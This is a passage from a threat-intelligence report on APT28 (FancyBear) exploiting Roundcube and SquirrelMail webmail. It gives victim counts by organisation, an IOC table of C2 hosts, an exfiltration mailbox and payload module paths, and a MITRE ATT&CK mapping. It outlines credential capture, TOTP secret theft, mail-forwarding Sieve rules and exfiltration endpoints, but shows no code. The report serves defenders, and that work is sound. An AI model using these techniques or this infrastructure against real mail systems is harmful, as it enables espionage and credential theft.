| `kyiv.gp.gov.ua` (Kyiv Prosecutor) | 12 | Ukraine |
| `mod.gov.rs` (Serbian MoD) | 4 | Serbia |
| `afas.ro` (Romanian AF Academy) | 5 | Romania |
| `pd.government.bg` (Bulgarian Govt.) | 4 | Bulgaria |
| `khmel.gp.gov.ua` | 3 | Ukraine |
| `hndgs.mil.gr` (Greek GEETHA) | 2 | Greece |

By country, the successful Sieve rules break down as: **Ukraine** (126), **Serbia** (6), **Romania** (5), **Bulgaria** (4), **Greece** (2).

The **vast majority** (826 out of 853 entries) redirected to `advenwolf@proton.me`, a Proton Mail address that served as FancyBear's primary email collection point. This email address was noted by Hunt.io in their analysis

A smaller set (27 entries) redirected to addresses at `gov.vppdr[.]com`, an attacker-controlled domain that typosquats the legitimate Ukrainian prosecution domain `vppdr.gp.gov.ua`. This domain is significant as it typosquats to Ukrainian government prosecutor’s office, specifically the southern-region defense specialization.

> The Romanian Air Force (`roaf.ro`) was the **single most targeted organisation** in the Sieve data, thankfully **every single attempt failed**. Their mail server did not support ManageSieve, which inadvertently protected them from FancyBear's most persistent access technique.

## TOTP/2FA Extraction

We observed **516 entries** with the `k_t_f_u_` prefix across **108 unique victim email addresses**. Decoding the base64 payloads revealed **256 contained real TOTP secrets** (with 4 recovery codes each) and **260 returned `no_key`**, meaning 2FA was not configured for those accounts. The most impacted organisations:

| Organisation | Unique victims |
|---|---|
| `roaf.ro` (Romanian Air Force) | 39 |
| `hndgs.mil.gr` (Greek GEETHA) | 28 |
| `arma.gov.ua` (Ukrainian Asset Recovery Agency) | 14 |
| `mod.gov.rs` (Serbian MoD) | 6 |
| `vppdr.gp.gov.ua` (Ukrainian Defense Prosecutor) | 5 |
| `afas.ro` (Romanian AF Academy) | 5 |

## Address Book Theft

We observed **2,870 entries** with the `t_e_f_u_` prefix across **157 unique Roundcube victim email addresses**. We recovered **11,527 unique email addresses** across **2,254 distinct domains** - the full scope of which is detailed in the *Impact & Victimology* section.
The organisations with the most address books stolen:

| Organisation | Address books stolen |
|---|---|
| `ptcu.gp.gov.ua` (Poltava Prosecutor) | 44 |
| `kir.gp.gov.ua` (Kirovohrad Prosecutor) | 32 |
| `hndgs.mil.gr` (Greek GEETHA) | 28 |
| `kyiv.gp.gov.ua` (Kyiv Prosecutor) | 12 |
| `vppdr.gp.gov.ua` (Ukranian Defence Prosecutor) | 11 |
| `chrg.gp.gov.ua` (Chernihiv Prosecutor) | 10 |

### Contact Email Address Network

Looking at all **11,527 unique emails**, it is clear FancyBear managed to recover a large network of connected contacts to their Government and Military victims:   

| Category | Email addresses | Key domains |
|---|---|---|
| Ukrainian military/security | 487 | `post.mil.gov.ua` (238), `ssu.gov.ua` (146), `dpsu.gov.ua` (41), `navy.mil.gov.ua` (32), `ngu.gov.ua` (19), `gur.gov.ua` (4) |
| Ukrainian prosecution | 908 | `gp.gov.ua` (117), regional `*.gp.gov.ua` (791) with subdomains: `zap` (224), `kir` (194), `ptcu` (126), `chrg` (53) |
| Ukrainian other government | ~1,507 | `krmr.gov.ua` (111), `nerc.gov.ua` (89), `dmsu.gov.ua` (65), `kvs.gov.ua` (62), `mail.gov.ua` (54), `land.gov.ua` (43), `probation.gov.ua` (34) |
| Ukrainian courts | 298 | `*.court.gov.ua` |
| Ukrainian police | 214 | `*.police.gov.ua` (169), `*.npu.gov.ua` (45) |
| Greek military/security | 468 | `hndgs.mil.gr` (249), `cd.mil.gr` (61), `haf.gr` (56), `navy.mil.gr` (34), `army.gr` (32), `mod.mil.gr` (18), `hellenicnavy.gr` (15) |
| Greek government/other | ~509 | `hcg.gr` (28), `mfa.gr` (24), `astynomia.gr` (12), `mindigital.gr` (10), plus ~435 Greek ISP/personal `.gr` addresses |
| Romanian military | 335 | `roaf.ro` (331), `afas.ro` (4) |
| NATO | 88 | `nmiotc.nato.int` (19), `nso.nato.int` (15), `hq.nato.int` (10), `shape.nato.int` (8), `act.nato.int` (8), `nspa.nato.int` (6), `ncia.nato.int` (5) |
| EU institutions | 32 | `eeas.europa.eu` (9), `eda.europa.eu` (5), `consilium.europa.eu` (4), `ec.europa.eu` (3), `enisa.europa.eu` (3) |
| Serbian | 248 | `mod.gov.rs` (22), `va.mod.gov.rs` (3), `vma.mod.gov.rs` (2), plus ~221 Serbian ISP/media/personal `.rs` addresses |
| Western allied military/govt | 103 | `bundeswehr.org` (11), `mail.mil` (10), `mindef.nl` (8), `mil.be` (8), `army.cz` (8), `forces.gc.ca` (6), `state.gov` (5), `us.af.mil` (5), `smd.difesa.it` (5), `mod.gov.uk` (4), `intradef.gouv.fr` (4), `vtg.admin.ch` (4), `mil.no` (4), `mod.uk` (3), `dla.mil` (2), `wat.edu.pl` (1) |
| North Macedonian | 7 | `mil.mk` (5), `mod.gov.mk` (2) |
| Bulgarian | 5 | `mod.bg` (1), `abv.bg` (2), `balkanistudies.bg` (1), `mail.bg` (1) |
| Personal email | ~5,079 | `gmail.com` (2,586), `ukr.net` (1,979), `i.ua` (142), `yahoo.com` (79), `meta.ua` (59), `hotmail.com` (47), `icloud.com` (38) |
| Other (Ukrainian .ua commercial, education, uncategorised) | ~1,239 | `nlu.edu.ua` (54), `ukroboronprom.com` (10), plus ~800 across 600+ miscellaneous domains |

# Conclusion

This analysis, built on the foundations of reporting by [Hunt.io](https://hunt.io/blog/operation-roundish-apt28-roundcube-exploitation), [CERT-UA](https://cert.gov.ua/article/6281123), and [ESET](https://www.welivesecurity.com/en/eset-research/operation-roundpress/), provides what we believe is one of the most interesting views ever obtained into an active cyber-enabled Russian espionage operation - not through sophisticated intelligence collection, but because FancyBear **left the door open**. The targeting was not random - Ukrainian regional prosecutors were the single most compromised group, potentially reflecting intelligence requirements related to war crimes investigations, while military targeting across **four NATO member states** aligns with documented regional security developments including the July 2024 Romania-Bulgaria-Greece military mobility agreement.

From a tradecraft perspective, this campaign reveals both capability and carelessness. FancyBear developed a modular, multi-platform exploitation toolkit where a victim simply *opening* a malicious email - **with no further clicks** - could result in their credentials stolen, their 2FA bypassed, emails within their mailbox exfiltrated, and a silent forwarding rule established that persists indefinitely. 

They evolved their indicators after CERT-UA's October 2024 disclosure, potentially demonstrating active monitoring of public reporting. Although they operated from the **same C2 server** for over **500 days** after public attribution.

> Even the most capable threat actors make mistakes. We hope this analysis serves as both a resource for defenders protecting webmail infrastructure and a reminder that "sophisticated" does not mean "infallible". 

# IOCs 

| Indicator | Type | Context |
|-----------|------|---------|
| 203.161.50[.]145 | IP Address | FancyBear C2 (NameCheap VPS); CERT-UA attribution; Roundcube exploitation (CVE-2023-43770), ClickFix; Operation Roundish opendir on port 8889 |
| 162.0.236[.]189 | IP Address | NameCheap VPS; Typosquat domain gov.vppdr[.]com resolves to this IP  |
| 209.74.89[.]76 | IP Address | NameCheap VPS; Typosquat domain mail.govmk[.]com resolves to this IP |  
| zhblz[.]com | Domain | Primary C2 domain; hosts XSS payloads, JS modules, C2 logging, credential phishing, lure PDFs; resolves to 203.161.50[.]145 |
| gov.vppdr[.]com | Domain | Attacker-controlled; observed in testing SquirrelMail |
| gov.vppdr[.]com | Domain | Attacker-controlled; typosquat of vppdr.gp.gov.ua; Sieve redirect target and SquirrelMail victim addresses (e.g. pru.mik@gov.vppdr.com) |
| advenwolf@proton[.]me | Email | Primary exfil/collection mailbox; Sieve forwarding target in worker.js/old_worker.js/scriptTaker; referenced in Hunt.io and CERT-UA |
| /zJ2w9x | URL Path | C2 telemetry logging endpoint (GET ?log=); used by worker.js, old_worker.js, worker2.js |
| /zJ2w9xP8cVb3D4s1mQe7rX6fT5yLg0HhKjNuAoIiZpCkRlOvBtWnYqMUEaSdvGbJ | URL Path | Long C2 logging path variant used by scriptTaker.js; telemetry in url.txt |
| SystemHealthChek | String | Roundcube Sieve filter name in scriptTaker.js; seen in CERT-UA reporting |
| SystemProtect | String | Roundcube Sieve filter name in addRedirectMailBox.js |
| /zJ2w9x/uploadfile/ | URL Path | Roundcube email exfiltration (POST .eml files) |
| /authentification.php | URL Path | Phishing form action | 
| /worker | URL Path | Roundcube XSS payload delivery (worker.js) |
| /worker2 | URL Path | SquirrelMail XSS payload delivery (worker2.js) |
| /addRedirectMailBox.js | URL Path | Sieve rule module (Roundcube) |
| /getUserCredentials.js | URL Path | Credential-stealer module (worker2) |
| /getUserCredentialsOLD.js | URL Path | Credential-stealer module (worker/old_worker) |
| /keyTwoAuth.js | URL Path | 2FA/TOTP extraction module (Roundcube twofactor_gauthenticator) |
| /adbook.js | URL Path | Roundcube address book exfil module  |
| /delTwoAuth.js | URL Path | 2FA deletion/manipulation module |
| Adob_Scan_15_ian._2025[.]pdf | File Name | Romanian air-force lure; post–phishing-login redirect target on zhblz.com |
| defense[.]pdf | File Name | Ukrainian defense support lure |
| dokladMVR[.]pdf | File Name | Bulgarian Interior Ministry report lure |
| energetikamk[.]pdf | File Name | North Macedonian energy sector lure |
| oborona[.]pdf | File Name | Ukrainian/defense lure |
| secure: bigdick | HTTP Header | Optional C2 auth header in servertest.py and backuBDMS/worker.js |
| roundcube[.]html | File Name | Phishing landing (Romanian Airforce Roundcube) |
| logon[.]html | File Name | Phishing landing (Ascentio clone) |

# MITRE

| Tactic | ID | Technique | Observed Usage |
|---|---|---|---|
| **Resource Development** | [T1583.001](https://attack.mitre.org/techniques/T1583/001/) | Acquire Infrastructure: Domains | Registered `zhblz[.]com` as primary C2 domain and `gov.vppdr[.]com` as typosquat of Ukrainian prosecutor domain |
| **Resource Development** | [T1583.003](https://attack.mitre.org/techniques/T1583/003/) | Acquire Infrastructure: Virtual Private Server | NameCheap VPS at `203.161.50[.]145` operated for 500+ days |
| **Resource Development** | [T1585.002](https://attack.mitre.org/techniques/T1585/002/) | Establish Accounts: Email Accounts | Created `advenwolf@proton[.]me` as primary email collection point for Sieve rule forwarding |
| **Resource Development** | [T1608.001](https://attack.mitre.org/techniques/T1608/001/) | Stage Capabilities: Upload Malware | Hosted XSS payloads (`worker.js`, `worker2.js`, `old_worker.js`), JS modules, and lure PDFs on C2 server |
| **Initial Access** | [T1566.002](https://attack.mitre.org/techniques/T1566/002/) | Phishing: Spearphishing Link | ClickFix lures impersonating Google Docs spreadsheets using reCAPTCHA Phish POC |
| **Execution** | [T1059.007](https://attack.mitre.org/techniques/T1059/007/) | Command and Scripting Interpreter: JavaScript | XSS payloads (`worker.js`, `worker2.js`, `scriptTaker.js`) executed within victim's authenticated browser session |
| **Execution** | [T1204.001](https://attack.mitre.org/techniques/T1204/001/) | User Execution: Malicious Link | ClickFix social engineering tricked victims into executing PowerShell via fake reCAPTCHA |
| **Credential Access** | [T1056](https://attack.mitre.org/techniques/T1056/) | Input Capture | Hidden auto-fill `<input>` fields injected into Roundcube DOM; `onclick` handler captured browser-autofilled credentials |
| **Credential Access** | [T1539](https://attack.mitre.org/techniques/T1539/) | Steal Web Session Cookie | XSS payloads executed within victim's authenticated session, inheriting session cookies for API requests |
| **Credential Access** | [T1111](https://attack.mitre.org/techniques/T1111/) | Multi-Factor Authentication Interception | `keyTwoAuth.js` extracted TOTP secrets and recovery codes from Roundcube's `twofactor_gauthenticator` plugin settings page |
| **Credential Access** | [T1056.003](https://attack.mitre.org/techniques/T1056/003/) | Input Capture: Web Portal Capture | Cloned Roundcube login pages (`roundcube.html`, `logon.html`) targeting Romanian Air Force for credential harvesting |
| **Discovery** | [T1087.003](https://attack.mitre.org/techniques/T1087/003/) | Account Discovery: Email Account | Extracted victim email address via `rcmail.env.username` (Roundcube) or HTML `To:` header parsing (SquirrelMail) |
| **Collection** | [T1114.002](https://attack.mitre.org/techniques/T1114/002/) | Email Collection: Remote Email Collection | Iterated through Inbox and Sent folders via Roundcube API, downloading each email by UID and exfiltrating as `.eml` files |
| **Collection** | [T1114.003](https://attack.mitre.org/techniques/T1114/003/) | Email Collection: Email Forwarding Rule | Created Sieve rules forwarding all incoming mail to `advenwolf@proton[.]me` and `gov.vppdr[.]com` addresses (143 victims) |
| **Collection** | [T1560](https://attack.mitre.org/techniques/T1560/) | Archive Collected Data | Address book data and credentials Base64-encoded before exfiltration, archives were stored on disk |
| **Exfiltration** | [T1041](https://attack.mitre.org/techniques/T1041/) | Exfiltration Over C2 Channel | Stolen credentials, TOTP secrets, and address books exfiltrated via GET requests to `zhblz[.]com/zJ2w9x?log=`; emails exfiltrated via POST to `/zJ2w9x/uploadfile/` |
| **Command and Control** | [T1071.001](https://attack.mitre.org/techniques/T1071/001/) | Application Layer Protocol: Web Protocols | All C2 communication over HTTPS; telemetry logging via GET parameters, email exfiltration via POST |
| **Command and Control** | [T1105](https://attack.mitre.org/techniques/T1105/) | Ingress Tool Transfer | Additional JS modules (`adbook.js`, `keyTwoAuth.js`, `getUserCredentials.js`, `addRedirectMailBox.js`) dynamically fetched from C2 and executed via `eval()` |

# Acknowledgements 

Ctrl-Alt-Intel would like to thank [Hunt.io](https://hunt.io) for their initial discovery, [CERT-UA](https://cert.gov.ua/article/6281123) for their continued vigilance in tracking this infrastructure, and [ESET](https://www.welivesecurity.com/en/eset-research/operation-roundpress/) for their broader mapping of the Operation RoundPress campaign.

We also want to thank Ctrl-Alt-Intel researcher, [@ice_wzl_cyber](https://x.com/ice_wzl_cyber), for his contributions in tracking this campaign and writing this blog.

# References

| Source | Title |
|---|---|
| Hunt.io | [Operation Roundish: APT28's Roundcube Exploitation](https://hunt.io/blog/operation-roundish-apt28-roundcube-exploitation) |
| CERT-UA | [CERT-UA#11689 — APT28 Spear-Phishing with ClickFix](https://cert.gov.ua/article/6281123) |
| ESET | [Operation RoundPress](https://www.welivesecurity.com/en/eset-research/operation-roundpress/) |
| UK NCSC | [Advisory: APT28 Exploits Known Vulnerability (PDF)](https://www.ncsc.gov.uk/files/Advisory_APT28-exploits-known-vulnerability.pdf) |
| CrowdStrike | [Who is Fancy Bear?](https://www.crowdstrike.com/en-us/blog/who-is-fancy-bear/) |
| Mandiant / Google Cloud | [APT28: A Window into Russia's Cyber Espionage Operations](https://cloud.google.com/blog/topics/threat-intelligence/apt28-a-window-into-russias-cyber-espionage-operations) |
| Microsoft | [Forest Blizzard / STRONTIUM Threat Profile](https://www.microsoft.com/en-us/security/security-insider/threat-landscape/forest-blizzard) |
| ESET | [Sednit: A Window into Russian Espionage Operations (PDF)](https://web-assets.esetstatic.com/wls/2016/10/eset-sednit-part-2.pdf) |
| AttackIQ | [Pyramid of Pain](https://www.attackiq.com/glossary/pyramid-of-pain-2/) |
| Reuters | [Romania, Bulgaria, Greece Sign Deal to Boost Military Mobility](https://www.reuters.com/world/europe/romania-bulgaria-greece-sign-deal-boost-military-mobility-2024-07-11) |
| Reuters | [Greece to Train Ukrainian F-16 Pilots, Zelensky Says](https://www.reuters.com/world/europe/greece-train-ukrainian-f-16-pilots-zelenskiy-says-2023-08-21) |
| Reuters | [Serbia Says It Will Investigate Russian Accusations on Arms](https://www.reuters.com/business/aerospace-defense/serbia-says-it-will-investigate-russian-accusations-that-it-ships-arms-ukraine-2025-05-30) |
| Reuters | [Ukraine's Zelensky Arrives in Albania; North Macedonia Joins Sanctions](https://www.reuters.com/world/europe/ukraines-zelenskiy-arrives-albania-foreign-minister-says-2024-02-28) |
| GitHub | [John Hammond — reCAPTCHA Phish POC](https://github.com/JohnHammond/recaptcha-phish) |
| GitHub | [twofactor_gauthenticator — Roundcube 2FA Plugin](https://github.com/alexandregz/twofactor_gauthenticator) |
| Censys | [Service History for 203.161.50.145](https://platform.censys.io/hosts/203.161.50.145/history) |
